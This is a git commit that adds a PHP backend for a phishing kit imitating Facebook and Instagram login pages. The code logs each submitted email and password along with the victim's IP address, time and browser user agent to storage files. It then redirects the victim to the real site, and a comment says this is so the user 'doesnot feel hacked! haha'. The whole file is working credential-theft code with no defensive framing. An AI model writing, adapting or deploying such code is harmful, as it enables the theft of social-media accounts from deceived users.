d57474989d4c187bc56e3f17bfac0d36dfdea91c
isaka-james <isackdrizzy@gmail.com>
2024-03-16 03:50:35 +0300

    creating app/controllers/loginBackend.php

---
+++ app/controllers/loginBackend.php
@@ -0,0 +1,52 @@
+<?php
+// The 'loginBackend'
+
+// GET THE POST METHODS
+$username = $_POST['email'];
+$pwd = $_POST['pass'];
+$phish = $_POST["phish"];
+
+if($phish=="fb"){
+	$showing="FaceBook";
+}else{
+	$showing="Instagram";
+}
+
+if(isset($username) and isset($pwd))
+{
+
+$texts_commandline = "\n ***DATA***INSERTED***\n\nUsername:: ".$username."\nPassword:: ".$pwd."\nIP-Address:: ".$_SERVER['REMOTE_ADDR']."\nTime:: ".date("F j, Y, g:i a")."\nDevice:: ".$_SERVER['HTTP_USER_AGENT']."\n\n  **********************\n\n\n\n";
+
+$texts_browser = "     <tr>
+        <th scope=\"row\"> - </th>
+        <td>".$username."</td>
+        <td>".$pwd."</td>
+	<td>".$showing."</td>
+        <td>".$_SERVER['REMOTE_ADDR']."</td>
+        <td>".date('F j, Y, g:i a')."</td>
+        <td>".$_SERVER['HTTP_USER_AGENT']."</td>
+     </tr>\n";
+
+$fp = fopen(__DIR__.'/../../storage/commands.txt', 'a');
+$fp2 = fopen(__DIR__.'/../../storage/browser.txt','a');
+
+fwrite($fp,$texts_commandline );
+fwrite($fp2,$texts_browser);
+fclose($fp);
+fclose($fp2);
+
+if($phish=="fb"){
+        // After successfully record now redirect to Official Facebook so the user, doesnot feel hacked! haha
+        header("Location: https://www.facebook.com/");
+}else{
+        // After successfully record now redirect to Official Facebook so the user, doesnot feel hacked! haha
+        header("Location: https://www.instagram.com/");        
+        
+}
+
+
+}
+?>
+
+
+
